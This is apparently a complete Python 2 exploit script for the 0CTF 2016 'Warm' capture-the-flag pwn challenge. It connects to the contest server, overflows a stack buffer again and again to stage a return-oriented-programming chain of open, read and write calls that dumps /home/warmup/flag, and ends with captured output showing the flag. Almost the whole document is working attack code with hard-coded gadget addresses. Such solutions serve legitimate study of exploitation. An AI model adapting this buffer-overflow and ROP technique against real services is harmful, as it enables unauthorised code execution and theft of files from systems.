#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# 0CTF 2016 - Warm (Pwn 2pt)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def recv_until(st):                    			# receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(16384)

  return ret

# --------------------------------------------------------------------------------------------------
def overflow(a, b, c, d):						# overflow 16 bytes on the stack, and restart program

	print recv_until('Welcome to 0CTF 2016!')	# eat input

	p  = 'A' * 32								# overflow
	p += struct.pack('<L', 0x080480D8)			# return to start()

	p += struct.pack('<L', a)					# set the next 4 slots
	p += struct.pack('<L', b)
	p += struct.pack('<L', c)
	p += struct.pack('<L', d)

	s.send( p )									# send data. No \n cause these're already 52 bytes


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
	
	s = socket.create_connection(('202.120.7.207', 52608))  # connect to server
	#s = socket.create_connection(('localhost', 7777))  	# connect to server

	file_desc = 3 								# file descriptor to read from
	flag_len  = 64								# how many bytes to read from flag file

			
	''' =======================================================================
		Fill ROP chain in reverse order
	======================================================================= '''	
	overflow(0, 0, 0, 0)						# this used as padding

	# 0x0804814D: address of exit()
	# 0x00000001: stdout
	# 0x080491D3: buffer to read flag
	# flag_len  : bytes to print
	overflow(0x0804814D, 0x00000001, 0x080491D3, flag_len)
	
	# 0: unused
	# 0: unused
	# 0: unused
	# 0x08048135: address of write()
	overflow(0, 0, 0, 0x08048135)

	overflow(0, 0, 0, 0)						# this used as padding

	# 0x080491D3: buffer to store flag
	# flag_len  : bytes to read from file
	# 0: unused
	# 0: unused
	overflow(0x080491D3, flag_len, 0, 0)

	# 0: unused
	# 0x0804811D: address of read()
	# 0x080481B8: pop gadget
	# file_desc : open file descriptor to read from
	overflow(0, 0x0804811D, 0x080481B8, file_desc)

	overflow(0, 0, 0, 0)						# this used as padding
	overflow(0, 0, 0, 0)						# this used as padding

	# 0x080481B8: pop gadget
	# 0x080491D3: buffer to store flag
	# 0x00000000: O_RDONLY
	# 0x00000004: mode
	overflow(0x080481B8, 0x080491D3, 0x00000000, 0x00000004)
	
	# 0: unused
	# 0: unused
	# 0: unused
	# 0x0804813A: 1 intstruction after write() (without setting eax)
	overflow(0, 0, 0, 0x0804813A)

	overflow(0, 0, 0, 0)						# this used as padding

	# 0x080491BC: address of "Welcome to 0CTF 2016!
	# 0x00000005: open() syscall number
	# 0: unused
	# 0: unused
	overflow(0x080491BC, 0x00000005, 0, 0)
	
	# 0: unused
	# 0x0804811D: address of read()
	# 0x080481B8: pop gadget
	# 0x00000000: stdin
	overflow(0, 0x0804811D, 0x080481B8, 0x00000000)

	overflow(0, 0, 0, 0)						# this used as padding
	overflow(0, 0, 0, 0)						# this used as padding


	''' =======================================================================
		Now, we can start the actual attack
	======================================================================= '''
	p  = 'A'*32 								# overflow
	p += struct.pack('<L', 0x0804811D)			# return to read()
	p += struct.pack('<L', 0x080481B8)			# pop gadget
	p += struct.pack('<L', 0x00000000)			# stdin
	p += struct.pack('<L', 0x080491D3)			# addr of "Good Luck!"	
	p += struct.pack('<L', 0x00000012)			# read 18 bytes
	s.send( p )

	print s.recv(1024)


	p  = '/home/warmup/flag\x00'				# 18 bytes
	p += '1234\n'								# 5 bytes
	s.send( p )
	
	print s.recv(1024) + s.recv(1024) + s.recv(1024)

	s.close()									# close socket
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/0ctf# ./warmup_expl_remote.py 
	Welcome to 0CTF 2016!

	Good Luck!
	Welcome to 0CTF 2016!

	[..... TRUNCATED FOR BREVITY .....]

	Good Luck!
	Welcome to 0CTF 2016!

	Good Luck!
	Welcome to 0CTF 2016!

	Good Luck!

	Welcome to 0CTF 2016!
	Good Luck!
	0ctf{welcome_it_is_pwning_time}
	.build-id.text
'''
# --------------------------------------------------------------------------------------------------
